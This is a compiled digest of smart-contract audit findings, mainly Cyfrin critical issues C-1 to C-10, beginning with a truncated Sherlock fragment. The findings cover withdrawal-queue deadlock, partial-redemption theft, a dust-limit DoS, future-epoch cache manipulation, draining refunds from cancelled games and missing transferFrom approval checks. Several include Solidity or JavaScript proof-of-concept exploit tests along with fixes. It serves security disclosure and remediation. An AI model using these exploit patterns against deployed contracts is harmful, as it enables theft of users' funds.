issuance. Impact The Pa in the Vault is stuck. PoC VaultPoolLib::rationedToAmm() does not deal with the Pa. function rationedToAmm(VaultPool storage self, uint256 ratio) internal view returns (uint256 ra, uint256 ct) {,→ uint256 amount = self.ammLiquidityPool.balance; (ra, ct) = MathHelper.calculateProvideLiquidityAmountBasedOnCtPrice(amount, ratio);,→ } Mitigation Distributed the Pa to users based on their LV shares or redeem the Pa for Ra and add liquidity to the new issued Ds or similar. Discussion ziankork valid. will fix ziankork This is originally has a feature planned for that, but we're still working on it and the feature still needs some time for us to solidify all aspect of it. that's why we won't fix this. Since the feature are considered non-trivial 55 Issue M-1: The UUPS proxie standard is im- plemented incorrectly, making the proto- col not upgradeable Source: https://github.com/sherlock-audit/2024-08-cork-protocol-judging/issues/47 The protocol has acknowledged this issue. Found by dimulski Summary Both the AssetFactory.sol and FlashSwapRouter.sol contracts inherit the UUPSUpgradeable contr

### 修補方式（實際）
Status: Fixed/Resolved in report.

## Cyfrin Fixed Issues (Merged)
- Count: `168`
- Filter: `Severity in {Critical, Medium}` and explicit `Fixed/Resolved markers`
- Source: `cyfrin/*.md`

## [C-1] Cancelling redeem requests permanently blocks the withdrawal queue
- Severity: `Critical`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:** `AccountableWithdrawalQueue` can deadlock at the head if the current head entry (`_queue.nextRequestId`) is fully removed (e.g., by a cancel that zeroes `shares` and clears `controller`) without advancing `nextRequestId`.

In [`AccountableWithdrawalQueue::_processUpToShares`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/queue/AccountableWithdrawalQueue.sol#L153-L156) and [`AccountableWithdrawalQueue::_processUpToRequestId`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/queue/AccountableWithdrawalQueue.sol#L193-L196), the loop checks `if (shares_ == 0) break;` before incrementing `nextRequestId`:
```solidity
(uint256 shares_, uint256 assets_, bool processed_) =
    _processRequest(request_, liquidity, maxShares_, precision_);

if (shares_ == 0) break;
```

When the head is an empty entry (`controller == address(0)`), [`AccountableWithdrawalQueue::_processRequest`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/queue/AccountableWithdrawalQueue.sol#L219) returns `(0, 0, true)`, `shares_ == 0`, the loop breaks:
```solidity
if (request.controller == address(0)) return (0, 0, true);
```
The head never advances, so every subsequent call to process or preview gets stuck on the same empty head forever.

This can be triggered by any user whose request is currently at the head by canceling any dust amount (even 1 wei) such that their head entry is fully deleted at the time of processing (e.g., instant cancel-fulfillment) in [`AccountableWithdrawalQueue::_delete`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/queue/AccountableWithdrawalQueue.sol#L130-L134):
```solidity
/// @dev Deletes a withdrawal request and its controller from the queue
function _delete(address controller, uint128 requestId) private {
    delete _queue.requests[requestId];
    delete _requestIds[controller];
}
```
Once the head becomes an empty slot and the pointer doesn’t move, the entire queue is bricked.


**Impact:** Queue is permanently stuck and no subsequent user will be able to withdraw.

**Proof of Concept:** Add the following test to `test/vault/AccountableWithdrawalQueue.t.sol`:
```solidity
function testHeadDeletionDeadlocksQueue() public {
    // Setup: deposits are instant, redemptions are queued, cancel is instantly fulfilled
    strategy.setInstantFulfillDeposit(true);
    strategy.setInstantFulfillRedeem(false);
    strategy.setInstantFulfillCancelRedeem(true);

    // Seed vault with liquidity and create first (head) request by Alice
    // This helper deposits for Alice and Bob at 1e36 price.
    _setupInitialDeposits(1e36, DEPOSIT_AMOUNT);

    // 1) Alice creates a redeem request -> head of queue (requestId = 1)
    uint256 aliceSharesToQueue = 1;
    vm.prank(alice);
    uint256 headId = vault.requestRedeem(aliceSharesToQueue, alice, alice);
    assertEq(headId, 1, "first request should be head (id = 1)");

    // 2) Alice cancels; cancel is fulfilled instantly by the strategy.
    //    This fully removes the head request entry (controller becomes address(0)),
    //    but _queue.nextRequestId is NOT advanced by the implementation.
    vm.prank(alice);
    vault.cancelRedeemRequest(headId, alice);

    // Sanity: queue indices should still point at the deleted head
    (uint128 nextRequestId, uint128 lastRequestId) = vault.queue();
    assertEq(nextRequestId, 1, "nextRequestId remains stuck at deleted head");
    assertGe(lastRequestId, 1, "there is at least one request in the queue history");

    // 3) Charlie makes a NEW redeem request -> tail (requestId = 2).
    //    This request is perfectly processable with existing liquidity.
    token.mint(charlie, 1000e6);
    vm.prank(charlie);
    token.approve(address(vault), 1000e6);
    vm.prank(charlie);
    vault.deposit(1000e6, charlie);

    uint256 charlieShares = vault.balanceOf(charlie) / 2;
    vm.prank(charlie);
    uint256 tailId = vault.requestRedeem(charlieShares, charlie, charlie);
    assertEq(tailId, 2, "second request should be tail (id = 2)");

    // Check queue bounds reflect head(=1, deleted) and tail(=2, valid)
    (nextRequestId, lastRequestId) = vault.queue();
    assertEq(nextRequestId, 1, "still pointing at deleted head");
    assertEq(lastRequestId, 2, "tail id should be 2");

    // 4) Attempt to process. BUG: _processUpToShares reads head slot (controller==0),
    //    inner _processRequest returns (0,0,true), outer loop sees shares_==0 and BREAKS
    //    BEFORE ++nextRequestId, so NOTHING gets processed and the queue is permanently stuck.
    uint256 assetsBefore = vault.totalAssets();
    uint256 used = vault.processUpToShares(type(uint256).max);
    assertEq(used, 0, "deadlock: processing does nothing while a valid tail exists");

    (uint256 _shares, uint256 _assets) = vault.processUpToRequestId(2);
    assertEq(_shares, 0, "deadlock: processing does nothing while a valid tail exists");
    assertEq(_assets, 0, "deadlock: processing does nothing while a valid tail exists");

    // 5) Verify tail wasn't progressed at all
    assertEq(vault.claimableRedeemRequest(0, charlie), 0, "tail remains unclaimable");
    assertEq(vault.pendingRedeemRequest(0, charlie), charlieShares, "tail remains fully pending");
    assertEq(vault.totalAssets(), assetsBefore, "no reserves changed due to deadlock");
    (nextRequestId, lastRequestId) = vault.queue();
    assertEq(nextRequestId, 1, "nextRequestId is still stuck at deleted head");
}
```

**Recommended Mitigation:** Consider incrementing the counter if it's processed, and `continue` instead of break:
```solidity
if (shares_ == 0) {
    if (processed_) {
        ++nextRequestId;
        continue;
    }
    break;
}
```

**Accountable:** Fixed in commits [`2df3becf`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/2df3becf29e20d0d1707eb0567b51fe103f606ed) and [`b432631`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/b432631089e400742b1e584976e26e9e7ae8da85)

**Cyfrin:** Verified. The counter is now incremented if the request was processed even if shares were 0.

## [C-2] Partial redemptions can be used to steal assets
- Severity: `Critical`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:** The request state is not handled properly when redeem requests are filled partially, leading to an inflated redemption price for the remaining part of the request.

- When a new redemption is pushed onto an existing requestID, then the average redemption price is calculated using the updated `totalValue` and updated `request.shares`. This is then stored as the `request.sharePrice` (used for calculating assets owed for those shares).

```solidity
        } else { // if controller had an existing active requestID
            requestId = requestId_;

            WithdrawalRequest storage request = _queue.requests[requestId_];

            request.shares += shares;

            if (processingMode == ProcessingMode.RequestPrice) {
                request.totalValue += shares.mulDiv(sharePrice, _precision);
                request.sharePrice = request.totalValue.mulDiv(_precision, request.shares); // the average sharePrice is being calculated here.
            } // the whole request will have a single price, averaged recursively as new redeem requests come up.

        totalQueuedShares += shares;
    }
```


- This works fine when request is fulfilled completely or cancelled completely as in those cases request data gets wiped out. But the problem is that when such a request is filled partially, this totalValue is never decreased while request.shares is decreased.


```solidity
    function _reduce(address controller, uint256 shares) internal returns (uint256 remainingShares) {
        uint128 requestId = _requestIds[controller];
        if (requestId == 0) revert NoQueueRequest();

        uint256 currentShares = _queue.requests[requestId].shares;
        if (shares > currentShares || currentShares == 0) revert InsufficientShares();

        remainingShares = currentShares - shares;
        totalQueuedShares -= shares;

        if (remainingShares == 0) {
            _delete(controller, requestId);
        } else {
            _queue.requests[requestId].shares = remainingShares;
        } // @audit the totalValue is not updated here.
    }
```


This is the attack path :
- User places a redeem request for 100 shares at a time when sharePrice == 2. So the request data stored is => {request.totalValue = 200, request.sharePrice = 2, request.shares = 100}.
- This request gets fulfilled partially ie. 50 shares. Resultant state => {request.totalValue = 200, request.sharePrice = 2, request.shares = 50}. User got 100 assets.
- User places another redeem request with 100 shares for the same controller address, thus the same requestID data will be modified. The new sharePrice will be calculated using an inflated "request.totalValue" and a normal request.shares. As per the calculation, the resultant state => {request.totalValue = 400, request.shares = 150, and request.sharePrice = 2.66}
- Assume this request gets filled completely. User now gets 400 assets.

User got a total of 500 assets for redeeming 200 shares, even though the sharePrice was only 2. This is because the calculation uses an inflated value of request.totalValue to calculate the redemption price.

- This request.sharePrice is used when calculating assets owed to the controller in  `_fulfillRedeemRequest()` flow

This means an inflated amount of assets will be added to the VaultState.maxWithdraw => allowing controller to claim more assets than they deserved if actual sharePrice was used.

Note : Partial redemption is possible when `fulfillRedeemRequest()` is called with a portion of the request's shares, and also possible when `processUptoShares()` is used and it hits a block with maxShares/ liquidityShares (such that a particular request is not processed completely.

**Impact:** An attacker can steal assets easily if their redeem request was fulfilled partially, in case the vault is configured with a processingMode == RequestPrice.

This issue exists only when processingMode == RequestPrice, as only then the request.sharePrice value is used for calculating assets owed.

**Recommended Mitigation:** Consider removing the processingMode logic entirely to simplify the system, or decrease redeemed assets from `request.totalValue` as part of the `_reduce()` function.

**Accountable:** Fixed in commit [`4e5eef5`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/4e5eef57464d548ec09048eae27b6fcc1489a5c3)

**Cyfrin:** Verified. `processingMode` removed as well as `totalValue`.

\clearpage
## High Risk

## [C-3] Dust limit attack on `force Update Nodes` allows Do S of rebalancing and potential vault insolvency
- Severity: `Critical`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** An attacker can exploit the `forceUpdateNodes()` function with minimal `limitStake` values to force all validator nodes into a pending update state. By exploiting precision loss in stake-to-weight conversion, an attacker can call `forceUpdateNodes` with a minimal limitStake (e.g., 1 wei), which sets the rebalancing flag without actually reducing any stake, effectively blocking legitimate rebalancing for the entire epoch.

Consider following scenario:
- Large vault undelegation requests reducing vault active state -> this creates excess stake that needs to be rebalanced
- Attacker calls `forceUpdateNodes(operator, dustAmount)` with `dustAmount` (1 wei)
- Minimal stake (≤ 1 wei) is "removed" from all available nodes
- Due to WEIGHT_SCALE_FACTOR precision, the actual weight sent to P-Chain doesn't change, but P-Chain still processes the update. Effectively, we are processing a non-update.
- The node is marked as `nodePendingUpdate[validationID] = true`
- All subsequent legitimate rebalancing attempts in the same epoch revert

`forceUpdateNodes()` is callable by anyone during the final window of each epoch and `limitStake` has no minimum bound check.

**Impact:**
- Operators with excess stake can exploit this to retain more stake than entitled
- Attackers can systematically prevent rebalancing for any operator in every epoch
- Blocked rebalancing means operator nodes retain stake that should be liquid in vaults. If multiple large withdrawals occur, we could end up in a protocol insolvency state when `vault liquid assets < pending withdrawal requests`

**Proof of Concept:** Copy the test in `AvalancheMiddlewarTest.t.sol`

```solidity
    function test_DustLimitStakeCausesFakeRebalancing() public {
        address attacker = makeAddr("attacker");
        address delegatedStaker = makeAddr("delegatedStaker");

         uint48 epoch0 = _calcAndWarpOneEpoch();

        // Step 1. First, give Alice a large allocation and create nodes
        uint256 initialDeposit = 1000 ether;
        (uint256 depositAmount, uint256 initialShares) = _deposit(delegatedStaker, initialDeposit);
        console2.log("Initial deposit:", depositAmount);
        console2.log("Initial shares:", initialShares);

         // Set large L1 limit and give Alice all the shares initially
        _setL1Limit(bob, validatorManagerAddress, assetClassId, depositAmount, delegator);
        _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, alice, initialShares, delegator);

        // Step 2. Create nodes that will use this stake
        // move to next epoch
        uint48 epoch1 = _calcAndWarpOneEpoch();
        (bytes32[] memory nodeIds, bytes32[] memory validationIDs,) =
            _createAndConfirmNodes(alice, 2, 0, true);

        uint48 epoch2 = _calcAndWarpOneEpoch();

        // Verify nodes have the stake
        uint256 totalNodeStake = 0;
        for (uint i = 0; i < validationIDs.length; i++) {
            uint256 nodeStake = middleware.getNodeStake(epoch2, validationIDs[i]);
            totalNodeStake += nodeStake;
            console2.log("Node", i, "stake:", nodeStake);
        }
        console2.log("Total stake in nodes:", totalNodeStake);

        uint256 operatorTotalStake = middleware.getOperatorStake(alice, epoch2, assetClassId);
        uint256 operatorUsedStake = middleware.getOperatorUsedStakeCached(alice);
        console2.log("Operator total stake (from delegation):", operatorTotalStake);
        console2.log("Operator used stake (in nodes):", operatorUsedStake);

        // Step 3. Delegated staker withdraws, reducing Alice's available stake
        console2.log("\n--- Delegated staker withdrawing 60% ---");
        uint256 withdrawAmount = (initialDeposit * 60) / 100; // 600 ether

        vm.startPrank(delegatedStaker);
        (uint256 burnedShares, uint256 withdrawalShares) = vault.withdraw(delegatedStaker, withdrawAmount);
        vm.stopPrank();

        console2.log("Withdrawn amount:", withdrawAmount);
        console2.log("Burned shares:", burnedShares);
        console2.log("Remaining shares for Alice:", initialShares - burnedShares);

         // Step 4. Reduce Alice's operator shares to reflect the withdrawal
        uint256 newOperatorShares = initialShares - burnedShares;
        _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, alice, newOperatorShares, delegator);


        console2.log("Updated Alice's operator shares to:", newOperatorShares);

        // Step 5. Move to next epoch - this creates the imbalance
        uint48 epoch3  = _calcAndWarpOneEpoch();

        uint256 newOperatorTotalStake = middleware.getOperatorStake(alice, epoch3, assetClassId);
        uint256 currentUsedStake = middleware.getOperatorUsedStakeCached(alice);

        console2.log("\n--- After withdrawal (imbalance created) ---");
        console2.log("Alice's new total stake (reduced):", newOperatorTotalStake);
        console2.log("Alice's used stake (still in nodes):", currentUsedStake);

        // Step 6. Attacker prevents legitimate rebalancing
        console2.log("\n--- ATTACKER PREVENTS REBALANCING ---");

        // Move to final window where forceUpdateNodes can be called
        _warpToLastHourOfCurrentEpoch();

        // Attacker front-runs with dust limitStake attack
        console2.log("Attacker executing dust forceUpdateNodes...");
        vm.prank(attacker);
        middleware.forceUpdateNodes(alice, 1); // 1 wei - minimal removal

        // Check if any meaningful stake was actually removed
        uint256 stakeAfterDustAttack = middleware.getOperatorUsedStakeCached(alice);
        console2.log("Used stake after dust attack:", stakeAfterDustAttack);

        uint256 actualRemoved = currentUsedStake > stakeAfterDustAttack ?
            currentUsedStake - stakeAfterDustAttack : 0;
        console2.log("Stake actually removed by dust attack:", actualRemoved);

       // The key issue: minimal stake removed, but still excess remains
        uint256 remainingExcess = stakeAfterDustAttack > newOperatorTotalStake ?
            stakeAfterDustAttack - newOperatorTotalStake : 0;
        console2.log("REMAINING EXCESS after dust attack:", remainingExcess);

        // 7. Try legitimate rebalancing - should be blocked
        console2.log("\n--- Attempting legitimate rebalancing ---");
        vm.expectRevert(); // Should revert with AvalancheL1Middleware__AlreadyRebalanced
        middleware.forceUpdateNodes(alice, 0); // Proper rebalancing with no limit
        console2.log(" Legitimate rebalancing blocked by AlreadyRebalanced");
    }
```

**Recommended Mitigation:**
- Consider preventing updates when the resulting P-Chain weight would be identical
- Consider setting a minimum on `limitStake` so that all left over stake is absorbed by the remaining active nodes. For eg.

```text
Leftover stake to remove: 100 ETH
Active nodes that can be reduced: 10 nodes
Minimum required limitStake: 100 ETH ÷ 10 nodes = 10 ETH per node
```
Any value less than this minimum would mean that operators can retain more stake than they should.

**Suzaku:**
Fixed in commit [ee2bdd5](https://github.com/suzaku-network/suzaku-core/pull/155/commits/ee2bdd544a2705e9f10bd250ad40555f115b11cb).

**Cyfrin:** Verified.

## [C-4] Future epoch cache manipulation via `calc And Cache Stakes` allows reward manipulation
- Severity: `Critical`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The `AvalancheL1Middleware::calcAndCacheStakes` function lacks epoch validation, allowing attackers to cache stake values for future epochs. This enables permanent manipulation of reward calculations by locking in current stake values that may become stale by the time those epochs arrive.

The `calcAndCacheStakes` function does not validate that the provided epoch is not in the future:

```solidity
function calcAndCacheStakes(uint48 epoch, uint96 assetClassId) public returns (uint256 totalStake) {
    uint48 epochStartTs = getEpochStartTs(epoch); // No validation of epoch timing
    // ... rest of function caches values for any epoch, including future ones
}
```

Once`totalStakeCached` flag is set, any subsequent call to `getOperatorStake` for that epoch and asset class will return the incorrect `operatorStakeCache` value, as shown below:

```solidity
function getOperatorStake(
    address operator,
    uint48 epoch,
    uint96 assetClassId
) public view returns (uint256 stake) {
    if (totalStakeCached[epoch][assetClassId]) {
        uint256 cachedStake = operatorStakeCache[epoch][assetClassId][operator];
        return cachedStake;
    }
    ...
}
```

When called with a future epoch, the function queries current stake values using checkpoint systems (upperLookupRecent) which return the latest available values for future timestamps

**Impact:** There are multiple issues with this, two major ones being:
- Attackers can inflate their reward shares by locking in high stake values before their actual stakes decrease. All subsequent deposits/withdrawals will not impact the cached stake once it gets updated for a given epoch.
- `forceUpdateNodes` mechanism can be compromised. Critical node rebalancing operations can be incorrectly skipped, leaving the system in an inconsistent state

**Proof of Concept:** Add the following test and run it:

```solidity
function test_operatorStakeOfTwoEpochsShouldBeEqual() public {
      uint256 operatorStake = middleware.getOperatorStake(alice, 1, assetClassId);
      console2.log("Operator stake (epoch", 1, "):", operatorStake);

      middleware.calcAndCacheStakes(5, assetClassId);
      uint256 newStake = middleware.getOperatorStake(alice, 2, assetClassId);
      console2.log("New epoch operator stake:", newStake);
      assertGe(newStake, operatorStake);

      uint256 depositAmount = 100_000_000_000_000_000_000;

      collateral.transfer(staker, depositAmount);

      vm.startPrank(staker);
      collateral.approve(address(vault), depositAmount);
      vault.deposit(staker, depositAmount);
      vm.stopPrank();

      vm.warp((5) * middleware.EPOCH_DURATION());

      middleware.calcAndCacheStakes(5, assetClassId);

      assertEq(
          middleware.getOperatorStake(alice, 4, assetClassId), middleware.getOperatorStake(alice, 5, assetClassId)
      );
  }
```

**Recommended Mitigation:** Consider adding epoch validation to prevent future epoch caching:
```solidity
function calcAndCacheStakes(uint48 epoch, uint96 assetClassId) public returns (uint256 totalStake) {
    uint48 currentEpoch = getCurrentEpoch();
    require(epoch <= currentEpoch, "Cannot cache future epochs"); //@audit added

    uint48 epochStartTs = getEpochStartTs(epoch);
    // ... rest of function unchanged
}
```
**Suzaku:**
Fixed in commit [32b1a6c](https://github.com/suzaku-network/suzaku-core/pull/155/commits/32b1a6c55c1ab436c557114939afb3163cc9ec8f).

**Cyfrin:** Verified.

\clearpage
## High Risk

## [C-5] During the yield phase, when using supported vaults, users can't withdraw vault assets they are entitled to
- Severity: `Critical`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** During the yield phase, when using supported vaults, users can't withdraw vault assets they are entitled to.

**Proof of Concept:**
```solidity
function test_yieldPhase_supportedVaults_userCantWithdrawVaultAssets() external {
    // user1 deposits $1000 USDe into the main vault
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);
    vm.stopPrank();

    assertEq(pUSDe.totalAssets(), user1AmountInMainVault);
    assertEq(pUSDe.balanceOf(user1), user1MainVaultShares);

    // admin triggers yield phase on main vault which stakes all vault's USDe
    pUSDe.startYieldPhase();
    // totalAssets() still returns same amount as it is overridden in pUSDeVault
    assertEq(pUSDe.totalAssets(), user1AmountInMainVault);
    // balanceOf shows pUSDeVault has deposited its USDe in sUSDe
    assertEq(USDe.balanceOf(address(pUSDe)), 0);
    assertEq(USDe.balanceOf(address(sUSDe)), user1AmountInMainVault);

    // create an additional supported ERC4626 vault
    MockERC4626 newSupportedVault = new MockERC4626(USDe);
    pUSDe.addVault(address(newSupportedVault));
    // add eUSDe again since `startYieldPhase` removes it
    pUSDe.addVault(address(eUSDe));

    // verify two additional vaults now suppported
    assertTrue(pUSDe.isAssetSupported(address(eUSDe)));
    assertTrue(pUSDe.isAssetSupported(address(newSupportedVault)));

    // user2 deposits $600 into each vault
    uint256 user2AmountInEachSubVault = 600e18;
    USDe.mint(user2, user2AmountInEachSubVault*2);

    vm.startPrank(user2);
    USDe.approve(address(eUSDe), user2AmountInEachSubVault);
    uint256 user2SubVaultSharesInEach = eUSDe.deposit(user2AmountInEachSubVault, user2);
    USDe.approve(address(newSupportedVault), user2AmountInEachSubVault);
    newSupportedVault.deposit(user2AmountInEachSubVault, user2);
    vm.stopPrank();

    // verify balances correct
    assertEq(eUSDe.totalAssets(), user2AmountInEachSubVault);
    assertEq(newSupportedVault.totalAssets(), user2AmountInEachSubVault);

    // user2 deposits using their shares via MetaVault::deposit
    vm.startPrank(user2);
    eUSDe.approve(address(pUSDe), user2SubVaultSharesInEach);
    pUSDe.deposit(address(eUSDe), user2SubVaultSharesInEach, user2);
    newSupportedVault.approve(address(pUSDe), user2SubVaultSharesInEach);
    pUSDe.deposit(address(newSupportedVault), user2SubVaultSharesInEach, user2);
    vm.stopPrank();

    // verify main vault total assets includes everything
    assertEq(pUSDe.totalAssets(), user1AmountInMainVault + user2AmountInEachSubVault*2);
    // main vault not carrying any USDe balance
    assertEq(USDe.balanceOf(address(pUSDe)), 0);
    // user2 lost their subvault shares
    assertEq(eUSDe.balanceOf(user2), 0);
    assertEq(newSupportedVault.balanceOf(user2), 0);
    // main vault gained the subvault shares
    assertEq(eUSDe.balanceOf(address(pUSDe)), user2SubVaultSharesInEach);
    assertEq(newSupportedVault.balanceOf(address(pUSDe)), user2SubVaultSharesInEach);

    // verify user2 entitled to withdraw their total token amount
    assertEq(pUSDe.maxWithdraw(user2), user2AmountInEachSubVault*2);

    // try and do it, reverts due to insufficient balance
    vm.startPrank(user2);
    vm.expectRevert(); // ERC20InsufficientBalance
    pUSDe.withdraw(user2AmountInEachSubVault*2, user2, user2);

    // try 1 wei more than largest deposit from user 1, fails for same reason
    vm.expectRevert(); // ERC20InsufficientBalance
    pUSDe.withdraw(user1AmountInMainVault+1, user2, user2);

    // can withdraw up to max deposit amount $1000
    pUSDe.withdraw(user1AmountInMainVault, user2, user2);

    // user2 still has $200 left to withdraw
    assertEq(pUSDe.maxWithdraw(user2), 200e18);

    // trying to withdraw it reverts
    vm.expectRevert(); // ERC20InsufficientBalance
    pUSDe.withdraw(200e18, user2, user2);

    // can't withdraw anymore, even trying 1 wei will revert
    vm.expectRevert();
    pUSDe.withdraw(1e18, user2, user2);
}
```

**Recommended Mitigation:** In `pUSDeVault::_withdraw`, inside the yield-phase `if` condition, there should be a call to `redeemRequiredBaseAssets` if there is insufficient `USDe` balance to fulfill the withdrawal.

Alternatively another potential fix is to not allow supported vaults to be added during the yield phase (apart from `sUSDe` which is added when the yield phase is enabled).

**Strata:** Fixed in commit [076d23e](https://github.com/Strata-Money/contracts/commit/076d23e2446ad6780b2c014d66a46e54425a8769#diff-34cf784187ffa876f573d51b705940947bc06ec85f8c303c1b16a4759f59524eR190) by no longer allowing adding new supporting vaults during the yield phase.

**Cyfrin:** Verified.

\clearpage

## [C-6] `Deposit Manager::_refund Entry Fee` doesn't deduct referral rewards allowing users to join then leave games to drain tokens via inflated referral rewards they aren't entitled to
- Severity: `Critical`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** `DepositManager::_payEntryFee` increments the referral rewards for the user's referrer:
```solidity
referralRewards[gameId][Registry(registry).referrers(player)] += pool.ticketPrice * REFERRER_FEE;
```

But `DepositManager::_refundEntryFee` doesn't deduct referral rewards when a user leaves the game and their fee is refunded.

**Impact:** Malicious users can intentionally join then leave rescheduled games to drain tokens from the contract via inflated referral rewards they aren't entitled to.

This bug can also occur naturally without malicious users simply by users joining then leaving, giving referrers more reward allocation than they are entitled to. Once the game ends and referrers claim their inflated rewards, there will not be enough tokens to distribute to winners or for creator / protocol fees.

**Recommended Mitigation:** `DepositManager::_refundEntryFee` should deduct from the referral rewards when refunding the game fee, opposite to how `_payEntryFee` adds to the referral rewards when receiving the game fee.

**Majority Games:**
Fixed in commit [50a1e6b](https://github.com/Engage-Protocol/engage-protocol/commit/50a1e6bb3a48a6056cbf0678030be0e9424ba052).

**Cyfrin:** Verified.

## [C-7] `Deposit Manager::get Rewards` always includes `REFERRER_FEE` resulting in 2 percent of every games' rewards not being distributed to winners when there were no referrers
- Severity: `Critical`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** `DepositManager::getRewards` always includes `REFERRER_FEE` when calculating the percentage of `totalCollectedAmount` available to distribute to winners:
```solidity
function getRewards(uint256 gameId) public view returns (uint256) {
    return gamePools[gameId].totalCollectedAmount
        * (BASIS_POINTS - (gamePools[gameId].creatorFee + gamePools[gameId].protocolFee + REFERRER_FEE)) / BASIS_POINTS;
}
```

**Impact:** If no referral rewards were accrued for a game, this calculation results in the game rewards being less than they should since the `REFERRER_FEE` basis points are still used to deduct from the `totalCollectedAmount`.

The missing 2% of rewards are permanently stuck in the contract unable to be paid out to game winners or retrieved by the sponsor.

**Recommended Mitigation:** Rather than using `REFERRER_FEE`, change `DepositManager::_payEntryFee, _refundEntryFee` to increment/decrement the total amount of referral rewards in a new storage variable.

Then in `DepositManager::getRewards` deduct the total amount of referral rewards from `gamePools[gameId].totalCollectedAmount`.

**Majority Games:**
Fixed in commit [e090f2e](https://github.com/Engage-Protocol/engage-protocol/commit/e090f2e1b5f42eb212fdbda7be94ccf295281075) by introducing a `CLAIMER_ROLE` which can collect referral fees assigned to `address(0)`, such that referral fees are always collected. `Registry::setReferrer` has been modified to prevent an address having `CLAIMER_ROLE` from becoming a referrer since then they couldn't collect fees associated with their address.

**Cyfrin:** Verified. We note that `AccessControl::grantRole` has not been overridden such that a referrer could be granted `CLAIMER_ROLE` which would prevent them from claiming referrals associated with their address.

## [C-8] Attacker can drain all tokens from cancelled game since `Session Manager::refund Cancelled Game` doesn't validate caller actually joined the game
- Severity: `Critical`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** Attacker can drain all tokens from cancelled game since `SessionManager::refundCancelledGame` doesn't validate caller actually joined the game.

**Impact:** Any cancelled game can be completely drained of tokens by a permissionless attacker.

**Proof of Concept:** Add test to `SessionManagerLeaveGame.t.sol`:
```solidity
function test_attackerDrainsCancelledGame() public {
    // create game
    _createGame();

    // contestant joins
    vm.startPrank(contestants[0]);
    TestUSDC(usdc).approve(address(sessionManager), 10 ether);
    sessionManager.joinGame(1);

    // game is cancelled
    vm.stopPrank();
    sessionManager.cancelGame(1);
    vm.warp(block.timestamp + (type(uint256).max - block.timestamp));

    // attacker who never joined gets a refund they don't deserve
    address attacker = address(0x1337);
    vm.startPrank(attacker);
    sessionManager.refundCancelledGame(1);
    vm.stopPrank();

    // attacker can repeat this using different addresses
    // which all get a refund even though they never joined
    // the game, until the tokens have been totally drained

    // attacker has drained all the tokens
    assertEq(TestUSDC(usdc).balanceOf(attacker), 10 ether);
    assertEq(TestUSDC(usdc).balanceOf(address(sessionManager)), 0 ether);
    (,,,, uint256 totalCollectedAmount, address token, bool feesPaid) = sessionManager.gamePools(1);
    assertEq(totalCollectedAmount, 0 ether);
    assertEq(token, usdc);
    assertEq(feesPaid, false);

    // user who actually joined game can't get refund as
    // tokens have been drained
    vm.expectRevert(); // NotEnoughFunds(0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, 0)]
    vm.startPrank(contestants[0]);
    sessionManager.refundCancelledGame(1);
    vm.stopPrank();
}
```

**Recommended Mitigation:** Only allow users who joined a game to claim refunds.

**Majority Games:**
Fixed in commit [7692203](https://github.com/Engage-Protocol/engage-protocol/commit/7692203e579204d829bbb558716a5c8637ac2ef5).

**Cyfrin:** Verified.

## [C-9] Investors can steal tokens from other investors since `Standard Token::transfer From` never checks spending approvals
- Severity: `Critical`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** Investors can steal tokens from other investors since `StandardToken::transferFrom` never checks spending approvals.

**Proof of Concept:** Add PoC to `test/dstoken-regulated.test.ts`:
```javascript
  describe('TransferFrom', function () {
    it('Investors can steal tokens from other investors', async function () {
      // setup 2 investors
      const [investor, investor2] = await hre.ethers.getSigners();
      const { dsToken, registryService, rebasingProvider } = await loadFixture(deployDSTokenRegulated);
      await registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_1, investor, registryService);
      await registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_2, investor2, registryService);

      // give first investor some tokens
      await dsToken.issueTokens(investor, 500);

      const valueToTransfer = 100;
      const shares = await rebasingProvider.convertTokensToShares(valueToTransfer);
      const multiplier = await rebasingProvider.multiplier();

      // connect as second investor
      const dsTokenFromInvestor = await dsToken.connect(investor2);

      // use `transferFrom` to steal tokens from first investor, even though
      // first investor never approved second investor as a spender
      await expect(dsTokenFromInvestor.transferFrom(investor, investor2, valueToTransfer))
        .to.emit(dsToken, 'TxShares')
        .withArgs(investor.address, investor2.address, shares, multiplier);
    });
  });
```

Run with: `npx hardhat test --grep "Investors can steal tokens from other investors"`.

**Recommended Mitigation:** `StandardToken::transferFrom` must enforce spending approvals.

**Securitize:** Fixed in commit [aefb895](https://github.com/securitize-io/dstoken/commit/aefb895e520d93ef0a8278ce3a7e88b2808478f5).

**Cyfrin:** Verified.

\clearpage

## [C-10] Consider wiping slot 177 on Linea `L2Message Service` after upgrade
- Severity: `Critical`
- Source report: `upgrade.md`

### Detailed Content (from source)
**Description:** After the upgrade, `L2MessageService` repurposes slot 177 for `__gap_ReentrancyGuardUpgradeable` but previously this was used for `_status`.

Using `cast storage 0x508Ca82Df566dCD1B0DE8296e70a96332cD644ec 177 --rpc-url https://rpc.linea.build` shows that slot 177 has a value of 1, so ideally this would be wiped to clean it when changing the usage of this slot into a gap.

